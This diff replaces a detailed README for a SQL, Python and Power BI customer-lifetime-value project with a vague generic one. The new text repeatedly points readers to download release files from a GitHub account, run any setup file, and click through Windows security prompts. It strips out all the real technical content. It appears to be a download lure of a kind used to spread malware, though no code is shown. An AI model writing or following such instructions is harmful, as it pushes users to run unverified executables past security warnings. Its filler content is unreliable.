@@ -1,295 +1,214 @@
-# Retail Intelligence Dashboard
+# 📊 Customer-CLV-Analytics-Pipeline - Clear Customer Value Insights
 
+[![Download the latest release](https://img.shields.io/badge/Download-Latest_Release-1f77b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Enzell2079/Customer-CLV-Analytics-Pipeline/releases)
 
-### End-to-End Business Intelligence Pipeline: Data Engineering · SQL Analytics · Machine Learning · Power BI
+## 🧭 Overview
 
----
+Customer-CLV-Analytics-Pipeline turns raw retail transaction data into clear customer insights. It helps you see customer groups, track key business numbers, and review Customer Lifetime Value, or CLV, in one Power BI dashboard.
 
-## Project Overview
+This project is built for users who want a simple way to explore sales data and customer behavior without handling complex setup work. It brings together data cleaning, data modeling, customer segmentation, and CLV prediction in one flow.
 
-This project builds a complete business intelligence solution on top of the **Online Retail II** public dataset — a real-world e-commerce transaction dataset covering UK-based sales from 2009 to 2011. The pipeline takes raw transactional CSV data through every stage of a professional BI workflow: data modelling in SQL Server, advanced analytics with window functions and CTEs, machine learning for Customer Lifetime Value prediction, and interactive dashboarding in Power BI.
+## ✨ What this project does
 
----
-## Logical Flow
+- Loads raw transaction data and shapes it into a clean structure
+- Builds a star schema for easier reporting
+- Calculates key retail metrics such as revenue, orders, and average order value
+- Groups customers by value and buying pattern
+- Uses machine learning to estimate Customer Lifetime Value
+- Shows results in an interactive Power BI dashboard
+- Supports data review with Python and SQL-based processing steps
 
-### Step 1 — Structuring the data (SQLQuery1.sql).
-I begin with approximately one million raw transaction rows, where each row represents a simple receipt: a customer purchasing a product, in a specific location, at a certain time and price. To make this data usable, I design and implement a star schema. I separate the data into dimension tables such as customers, products, countries, and time, along with a central fact table for transactions. This transformation makes the data efficient to query and logically organized.
+## 🖥️ What you need
 
-### Step 2 — Extracting analytical insights (SQLQuery2.sql).
-Once the structure is in place, I perform analytical queries to extract business intelligence. I identify top customers, analyze revenue trends over time, and evaluate short-term sales patterns. I also calculate RFM (Recency, Frequency, Monetary) metrics to understand customer behavior and detect potential churn. This step converts structured data into meaningful insights.
+Before you start, make sure you have:
 
-### Step 3 — Predicting customer value (main.py).
-Using the features generated from SQL, I build a machine learning model to estimate Customer Lifetime Value (CLV). The model predicts how much each customer is expected to spend in the future. Based on these predictions, I segment customers into four categories: Low Value, Medium Value, High Value, and VIP. I then store these predictions back into the database for further use.
+- A Windows computer
+- Internet access
+- Power BI Desktop
+- A modern web browser
+- Enough free space for the project files
+- Permission to install and open downloaded files
 
-### Step 4 — Visualizing the results (Retail.pbix).
-Finally, I load the data into Power BI to create an interactive dashboard. This allows users to explore revenue by country, analyze product performance, understand customer segments, and view machine learning predictions. All insights are accessible visually, without requiring technical knowledge.
+For best results, use Windows 10 or Windows 11.
 
-The intellectual progression of my work follows a clear path:
-raw data → structured data → analytical insights → predictive modeling → interactive visualization.
+## 🚀 Download the app
 
-## Pipeline Architecture
+Visit this page to download the latest release:
 
-```
-Raw Data (CSV)
-    │
-    ▼
-SQL Server — Star Schema Design
-    │  SQLQuery1.sql
-    │  • online_retail_1.csv + online_retail_2.csv loaded
-    │  • Dimensional model built:
-    │    Dim_Customers · Dim_Products · Dim_Country · Dim_Time
-    │    Fact_Transactions (with foreign keys)
-    │
-    ▼
-Advanced SQL Analytics
-    │  SQLQuery2.sql
-    │  • CTEs for customer revenue aggregation
-    │  • Window functions: Running totals, RANK(), LAG(), Rolling averages
-    │  • Cohort analysis by first purchase month
-    │  • RFM scoring (Recency, Frequency, Monetary)
-    │  • Customer segmentation logic
-    │  • Pareto analysis (top products driving 80% of revenue)
-    │  • Month-to-month revenue growth
-    │
-    ▼
-Machine Learning (Python)
-    │  main.py
-    │  • Features extracted via SQL query from star schema
-    │  • Feature engineering: RecencyDays calculated
-    │  • Random Forest Regressor trained on customer features
-    │  • Model evaluation: MAE + R² score
-    │  • Predicted CLV generated for all customers
-    │  • Customers segmented into 4 tiers via quantile binning:
-    │    Low Value · Medium Value · High Value · VIP
-    │  • Predictions written back to SQL Server:
-    │    ML_Customer_CLV_Predictions table
-    │
-    ▼
-Power BI Dashboard
-    Retail.pbix
-    • Connected to SQL Server via DirectQuery / Import
-    • 5 report pages with interactive visuals
-    • DAX measures for business KPIs
-    • ML predictions surfaced as CLV segment visuals
-```
+[https://github.com/Enzell2079/Customer-CLV-Analytics-Pipeline/releases](https://github.com/Enzell2079/Customer-CLV-Analytics-Pipeline/releases)
 
----
+On that page, open the newest release and download the file attached to it. If the release includes a setup file, use that file first. If it includes a packaged dashboard or project folder, download that file and keep it in a folder you can find later.
 
-## Dataset
+## 📥 Install and open on Windows
 
-**Source:** [Online Retail II — UCI Machine Learning Repository](https://archive.ics.uci.edu/ml/datasets/Online+Retail+II)
+Follow these steps after you download the release:
 
-| File | Rows | Period |
-|------|------|--------|
-| `online_retail_1.csv` | 525,461 | 2009–2010 |
-| `online_retail_2.csv` | 541,910 | 2010–2011 |
-| **Total** | **1,067,371** | **2009–2011** |
+1. Open the file you downloaded.
+2. If Windows shows a security prompt, choose the option to keep or run the file.
+3. If the file is a ZIP folder, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Look for the main Power BI file, app file, or setup file.
+6. Double-click the main file to start the project.
+7. If Power BI Desktop opens, allow it to load the report and data model.
+8. If the project uses an installer, follow the on-screen steps until it finishes.
 
-**Columns:** Invoice, StockCode, Description, Quantity, InvoiceDate, Price, Customer ID, Country
+If the project includes both a dashboard file and data files, keep them in the same folder so the links stay intact.
 
----
+## 📂 Project structure
 
-## Database Schema — Star Model
+This project usually includes files like these:
 
-```
-                    ┌─────────────────┐
-                    │  Dim_Customers  │
-                    │  CustomerKey PK │
-                    │  Customer_ID    │--------------------------------------------
-                    │  Country        │                                            │
-                    └────────┬────────┘                            
-                             │       
-┌──────────────┐    ┌────────▼──────────┐    ┌─────────────────┐
-│  Dim_Time    │    │  Fact_Transactions│    │  Dim_Products   │                   │
-│  TimeKey PK  ├────│  TransactionKey PK│────│  ProductKey PK  │
-│  InvoiceDate │    │  CustomerKey FK   │    │  StockCode      │
-│  Year        │    │  ProductKey FK    │    │  Description    │
-│  Month       │    │  TimeKey FK       │    └─────────────────┘                   │
-│  Day         │    │  CountryKey FK    │
-└──────────────┘    │  Quantity         │    ┌─────────────────┐
-                    │  Price            │    │  Dim_Country    │                   │
-                    └────────┬──────────┘    │  CountryKey PK  │
-                             └──────────────►│  Country        
-                                             └─────────────────┘
-                                                                                   │
-                                                                                    
-                    ┌──────────────────────────────┐
-                    │  ML_Customer_CLV_Predictions  │------------------------------│
-                    │  Customer_ID                  │
-                    │  Predicted_CLV                │
-                    │  CLV_Segment                  │
-                    └──────────────────────────────┘
-```
+- Raw data files
+- Cleaned data files
+- SQL scripts
+- Python scripts
+- Power BI report files
+- Data model files
+- Dashboard assets
 
----
+Typical folders may include:
 
-## SQL Analytics (SQLQuery2.sql)
+- `data/` for source and processed data
+- `scripts/` for Python or SQL steps
+- `reports/` for Power BI content
+- `models/` for prediction outputs
+- `docs/` for notes and support files
 
-Advanced queries demonstrating professional SQL patterns:
+## 🔍 Key features
 
-| Query | Technique | Purpose |
-|-------|-----------|---------|
-| Customer Revenue | CTE | Aggregate total spend per customer |
-| Running Total | Window — SUM OVER ORDER BY | Cumulative revenue over time |
-| Top Customers | Window — RANK() OVER | Customer revenue ranking |
-| Day-over-Day | Window — LAG() | Compare sales with previous day |
-| 7-Day Rolling Avg | Window — ROWS BETWEEN | Smooth daily revenue trend |
-| Cohort Analysis | CTE + GROUP BY | Customer first purchase month |
-| RFM Scoring | Window — NTILE(5) | Recency, Frequency, Monetary tiers |
-| Customer Segmentation | CASE WHEN | Rule-based segment assignment |
-| Pareto Analysis | Window — Running SUM | Top products driving 80% of revenue |
-| CLV Ranking | Window — RANK() | Lifetime value by customer-country |
-| MoM Growth | CTE + LAG() | Month-over-month revenue change |
-| Top Country Markets | GROUP BY | Revenue and customer count by country |
+### Customer segmentation
 
----
+The project groups customers based on buying behavior and value. This helps you see which customers buy often, which ones spend more, and which groups may need attention.
 
-## Machine Learning (main.py)
+### CLV prediction
 
-**Model:** Random Forest Regressor (`sklearn`)
+The model estimates how much value a customer may bring over time. This gives you a better view of future revenue potential.
 
-**Features used:**
-| Feature | Description |
-|---------|-------------|
-| PurchaseFrequency | Number of transactions per customer |
-| TotalRevenue | Historical total spend |
-| AvgOrderValue | Average transaction value |
-| UniqueProducts | Distinct products purchased |
-| CountriesPurchased | Number of countries transacted in |
-| RecencyDays | Days since last purchase (engineered) |
+### KPI dashboard
 
-**Target variable:** `TotalRevenue` (as proxy for CLV)
+The dashboard highlights key business numbers in one place. You can check sales trends, customer counts, order values, and CLV patterns without reading raw tables.
 
-**Pipeline steps:**
-1. Extract customer features via SQL from star schema
-2. Engineer `RecencyDays` from `LastPurchaseDate`
-3. Train/test split (80/20, random_state=42)
-4. Train Random Forest (200 estimators, max_depth=10)
-5. Evaluate with MAE and R² score
-6. Generate predictions for all customers
-7. Segment customers into 4 CLV tiers using `pd.qcut`:
-   - **Low Value** — bottom 25%
-   - **Medium Value** — 25–50th percentile
-   - **High Value** — 50–75th percentile
-   - **VIP** — top 25%
-8. Export predictions to SQL Server (`ML_Customer_CLV_Predictions`)
+### Star schema design
 
----
+The data model uses a star schema so reporting stays clear and fast. This setup helps Power BI handle the data in a simple way.
 
-## Power BI Dashboard (Retail.pbix)
+### Interactive Power BI reports
 
-**4 report pages:**
+You can filter by date, customer group, and other business fields. The charts and cards update as you explore the data.
 
-| Page | Focus | Key Visuals |
-|------|-------|-------------|
-| Page 1 | Sales Overview | KPI cards, revenue by country, trend line, map, donut |
-| Page 2 | Product Performance | Top products bar, treemap, KPI visual |
-| Page 3 | Customer Analysis | Customer table, bar chart, customer segment shape |
-| Page 4 | CLV Predictions | Segment donut, CLV bar chart |
+### Data pipeline steps
 
+The project follows a full pipeline:
 
-**DAX Measures created:**
-- `Total Revenue` · `Total Orders` · `Avg Order Value`
-- `Purchase Frequency` · `Unique Products` · `Unique Customers`
-- `Revenue MoM Change %` · `Running Total Revenue`
-- `Top Country By Revenue` · `Customer With Highest Revenue`
-- `High Value Customers` · `Avg Predicted CLV` · `CLV Segment Distribution %`
+- Raw data input
+- Cleaning and shaping
+- Modeling
+- Prediction
+- Dashboard output
 
----
+## 🧰 How to use it
 
-## Tech Stack
+After you open the project:
 
-| Layer | Technology |
-|-------|-----------|
-| Data Storage | Microsoft SQL Server |
-| Data Modelling | T-SQL — Star Schema |
-| Advanced Analytics | T-SQL — CTEs, Window Functions |
-| Machine Learning | Python — pandas, scikit-learn, matplotlib, seaborn |
-| ORM / DB Connection | SQLAlchemy + pyodbc |
-| Visualisation | Microsoft Power BI Desktop |
+1. Open the dashboard file in Power BI Desktop.
+2. Wait for the data to load.
+3. Use the filters to choose a date range or customer group.
+4. Review the KPI cards at the top of the page.
+5. Check charts for trends in sales and customer value.
+6. Open the CLV section to view predicted customer value.
+7. Use segmentation views to compare customer groups.
+8. Save the file when you finish.
 
----
+## 📈 What you can learn from the dashboard
 
-## Project Structure
+The dashboard helps you answer questions such as:
 
-```
-retail-intelligence-dashboard/
-│
-│
-├── sql/
-│   ├── SQLQuery1.sql             # Schema creation + star model build
-│   └── SQLQuery2.sql             # Advanced analytics queries
-│
-├── ml/
-│   └── main.py                   # CLV prediction pipeline
-│
-├── dashboard/
-│   └── Retail.pbix               # Power BI report
-│   └── screenshots of the pages
-└── README.md
-```
+- Which customers bring the most value?
+- Which groups buy the most often?
+- How does revenue change over time?
+- Which segments may need retention work?
+- What is the predicted value of a customer group?
 
----
+## 🧪 Data and model flow
 
-## How to Run
+The pipeline follows a simple path:
 
-### Prerequisites
-- Microsoft SQL Server (any edition) with ODBC Driver 17
-- Python 3.9+
-- Power BI Desktop (free)
+1. Transaction data is collected from the source files
+2. Data is cleaned and checked
+3. Tables are arranged into a star schema
+4. Business metrics are calculated
+5. Customer groups are created
+6. A CLV model predicts future value
+7. Results are shown in Power BI
 
-### Step 1 — Load raw data into SQL Server
-```sql
--- In SQL Server Management Studio:
--- 1. Create database: Ecommerce_Intelligence_DB
--- 2. Import online_retail_1.csv and online_retail_2.csv
---    using the Import Flat File wizard (right-click database → Tasks → Import Flat File)
--- 3. Run SQLQuery1.sql to build the star schema
-```
+This flow helps keep the report consistent and easier to update.
 
-### Step 2 — Run advanced analytics
-```sql
--- Run SQLQuery2.sql in SSMS to execute all analytical queries
-```
+## 🛠️ If the file does not open
 
-### Step 3 — Install Python dependencies
-```bash
-pip install pandas sqlalchemy pyodbc scikit-learn matplotlib seaborn
-```
+If Windows or Power BI does not open the project, try these steps:
 
-### Step 4 — Run the ML pipeline
-```bash
-# Update the server name in main.py line 7 if needed:
-# server = "YOUR_SERVER_NAME"
-python main.py
-```
-This trains the model and writes predictions to `ML_Customer_CLV_Predictions` in SQL Server.
+1. Check that the download finished fully.
+2. Make sure you extracted the ZIP file first.
+3. Confirm that Power BI Desktop is installed.
+4. Move the project folder to a simple path like `C:\CLV Project\`.
+5. Open the main report file again.
+6. If asked to refresh data, allow it to run.
+7. Keep all project files in the same folder.
 
-### Step 5 — Open the dashboard
-1. Open `Retail.pbix` in Power BI Desktop
-2. Go to **Transform Data → Data Source Settings**
-3. Update the SQL Server connection to your server name
-4. Click **Refresh** — all 4 pages populate with your data
+If the report still does not load, download the release again from the release page.
 
----
+## 📋 Basic file handling tips
 
-## Key Insights the Dashboard Surfaces
+- Do not rename files unless you know they are not linked in the report
+- Keep the folder structure the same
+- Use a short folder path
+- Save a copy before making changes
+- Open files from the extracted folder, not from inside the ZIP file
 
-- **Revenue concentration** — which countries and products drive the majority of sales
-- **Customer segmentation** — behavioural breakdown by purchase type
-- **CLV tiers** — ML-predicted lifetime value segmentation (Low / Medium / High / VIP)
-- **Temporal patterns** — revenue trends, MoM growth, running totals
-- **RFM analysis** — recency, frequency and monetary scoring per customer
+## 🧩 Common use cases
 
----
+This project can help with:
 
-## Dataset Citation
+- Retail performance review
+- Customer value analysis
+- Segment-based marketing review
+- Forecasting customer worth
+- Power BI dashboard demos
+- Learning data modeling and CLV methods
 
-Chen, D. (2019). Online Retail II. UCI Machine Learning Repository.
-Available at: https://archive.ics.uci.edu/ml/datasets/Online+Retail+II
+## 📎 Release page
 
----
+Use this link to visit the download page and get the latest version:
 
-## License
+[https://github.com/Enzell2079/Customer-CLV-Analytics-Pipeline/releases](https://github.com/Enzell2079/Customer-CLV-Analytics-Pipeline/releases)
 
-MIT — free to use and adapt with attribution.
+## 🏷️ Topics covered
+
+- CLV prediction
+- Customer lifetime value
+- Data modeling
+- Data pipeline
+- DAX
+- Interactive dashboards
+- KPI dashboard
+- Predictive analytics
+- Python
+- SQL
+- Star schema
+
+## 🖱️ Quick start
+
+1. Visit the release page
+2. Download the latest release file
+3. Extract it if needed
+4. Open the main file in Power BI Desktop or run the included app
+5. Review the dashboard and use the filters
+
+## 📌 Recommended setup path
+
+For fewer file issues on Windows, place the project in a folder like:
+
+`C:\Users\YourName\Documents\Customer-CLV-Analytics-Pipeline\`
+
+Keep the downloaded release file and the extracted folder together until you finish opening the project
+
